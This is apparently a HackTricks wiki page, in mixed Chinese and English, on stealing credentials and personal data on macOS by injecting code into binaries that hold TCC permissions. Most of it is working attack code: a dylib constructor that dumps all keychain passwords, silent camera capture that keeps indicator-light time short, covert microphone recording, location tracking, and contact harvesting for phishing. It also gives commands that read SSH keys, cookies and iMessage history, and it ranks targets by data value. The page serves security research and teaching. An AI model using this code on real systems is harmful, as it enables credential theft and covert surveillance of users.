# macOS Credential & Data Theft via TCC Permissions

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

macOS TCC (Transparency, Consent, and Control) 保护对敏感用户数据的访问。当攻击者**攻陷一个已经拥有 TCC 授权的二进制文件**时，他们会继承这些权限。本页记录了与数据窃取相关的各项 TCC 权限的利用潜力。

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **silently inherits all its TCC permissions**。当同一进程读取受保护数据时，不会有额外的提示或验证。

---

## Keychain Access Groups

### The Prize

macOS 钥匙串存储：
- **Wi-Fi passwords** — 所有保存的无线网络凭证
- **Website passwords** — Safari、Chrome（使用钥匙串时）以及其他浏览器的密码
- **Application passwords** — 电子邮件帐户、VPN 凭证、开发令牌
- **Certificates and private keys** — 代码签名、客户端 TLS、S/MIME 加密
- **Secure notes** — 用户存储的机密

### 权限（entitlement）： `keychain-access-groups`

钥匙串条目被组织为 **access groups**。应用的 `keychain-access-groups` entitlement 列出它可以访问的组：
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### 利用
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## 摄像头访问 (kTCCServiceCamera)

### 利用

具有摄像头 TCC 授权的二进制（通过 `kTCCServiceCamera` 或 `com.apple.security.device.camera` entitlement）可以捕获照片和视频：
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### 静默捕获
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> 从 **macOS Sonoma** 开始，菜单栏中的摄像头指示灯为持续可见，无法以编程方式隐藏。在 **旧版 macOS** 上，短时间的捕获可能不会产生明显的指示灯。
  
---

## 麦克风访问 (kTCCServiceMicrophone)

### 利用

麦克风访问会捕获来自内建麦克风、耳机或已连接音频输入设备的所有音频：
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### 攻击：Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## 位置跟踪 (kTCCServiceLocation)

### 利用
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### 持续跟踪
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## 联系人 / 日历 / 照片

### 个人数据外泄

| TCC 服务 | Framework | 数据 |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | 姓名、邮箱、电话、地址 |
| `kTCCServiceCalendar` | `EventKit` | 会议、参会者、地点 |
| `kTCCServicePhotos` | `Photos.framework` | 照片、截图、位置元数据 |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### 联系人收集
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## iCloud 帐户访问

### 权限: `com.apple.private.icloud-account-access`

此权限允许与 `com.apple.iCloudHelper` XPC 服务通信，提供对以下内容的访问：
- **iCloud tokens** — 用于用户 Apple ID 的身份验证令牌
- **iCloud Drive** — 来自所有设备的同步文档
- **iCloud Keychain** — 在所有 Apple 设备间同步的密码
- **Find My** — 用户所有 Apple 设备的位置
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Compromising an iCloud-entitled binary extends the attack from a **single device to the entire Apple ecosystem**: other Macs, iPhones, iPads, Apple Watch. iCloud Keychain sync means passwords from all devices are accessible.

---

## 完全磁盘访问 (kTCCServiceSystemPolicyAllFiles)

### 最强大的 TCC 权限

完全磁盘访问授予对系统上**每个文件**的读取能力，包括：
- 其他应用的数据（Messages、Mail、Safari 历史记录）
- TCC 数据库（显示所有其他权限）
- SSH 密钥和配置
- 浏览器 cookies 和会话令牌
- 应用数据库和缓存
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## 利用优先矩阵

在评估可注入的由 TCC 授予权限的二进制时，应按数据价值优先排序：

| 优先级 | TCC Permission | 原因 |
|---|---|---|
| **关键** | Full Disk Access | 可访问所有内容 |
| **关键** | TCC Manager | 可授予任何权限 |
| **高** | Keychain Access Groups | 所有存储的密码 |
| **高** | iCloud Account Access | 可导致多设备被攻破 |
| **高** | Input Monitoring (ListenEvent) | 键盘记录 |
| **高** | Accessibility | GUI 控制，可自我授权 |
| **中** | Screen Capture | 捕获屏幕可视数据 |
| **中** | Camera + Microphone | 监视 |
| **中** | Contacts + Calendar | 社工数据 |
| **低** | Location | 物理定位追踪 |
| **低** | Photos | 个人数据 |

## 枚举脚本
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## 参考资料

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objective-see.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
